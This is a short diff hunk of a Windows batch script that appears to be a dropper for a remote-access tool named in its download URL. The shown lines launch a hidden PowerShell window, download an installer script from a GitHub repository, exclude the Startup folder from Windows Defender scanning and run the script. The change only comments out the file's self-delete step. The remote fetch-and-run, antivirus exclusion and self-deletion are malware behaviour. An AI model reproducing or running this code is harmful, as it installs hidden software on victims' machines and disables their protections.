@@ -30,4 +30,4 @@ if '%errorlevel%' NEQ '0' (
 powershell -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/installer.ps1 -OutFile installer.ps1; Add-MpPreference -ExclusionPath '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup'; .\installer.ps1"
 
 @REM self delete
-del "%~f0"
+@REM del "%~f0"
